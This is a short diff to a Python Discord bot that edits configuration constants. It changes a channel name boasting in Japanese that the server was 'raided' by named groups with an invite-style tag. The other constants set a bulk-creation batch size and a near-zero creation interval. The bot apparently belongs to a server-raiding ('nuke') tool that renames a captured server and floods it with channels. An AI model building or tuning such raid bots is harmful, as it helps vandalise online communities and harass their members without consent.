@@ -13,7 +13,7 @@ intents.members = True
 bot = commands.Bot(command_prefix="!", intents=intents)
 
 SERVER_NAME = "トイ神の植民地"
-CHANNEL_NAME = "ここはトイ神の集い|TISNに荒らされました😂"
+CHANNEL_NAME = "ここはトイ神の集い|TISNとおぜうの集いgg.acvrに荒らされました😂"
 BATCH_SIZE = 30  # 一括作成する数
 CREATE_INTERVAL = 0.0001  # 限界まで短縮
 
